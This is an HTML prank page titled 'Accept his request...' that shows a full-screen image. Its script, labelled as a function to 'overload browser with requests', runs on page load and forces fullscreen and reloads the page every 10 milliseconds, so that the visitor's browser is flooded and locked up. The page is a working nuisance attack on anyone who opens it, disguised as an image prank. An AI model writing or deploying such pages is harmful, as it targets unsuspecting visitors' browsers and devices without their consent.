<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Accept his request...</title>
<style>
  body, html {
    margin: 0;
    padding: 0;
    background-color: black; /* Set the background color to black */
    height: 100%;
    overflow: hidden;
  }

  #sigma {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
</style>
</head>
<body>

<img id="sigma" src="untitled.jpeg" alt="Prank Image">

<script>
  // Function to overload browser with requests
  function overload() {
    setInterval(function() {
      document.documentElement.requestFullscreen().catch(() => {});
      location.reload();
    }, 10); // Reload every 10ms
  }

  // Run overload immediately when the page is accessed
  window.onload = overload;
</script>

</body>
</html>
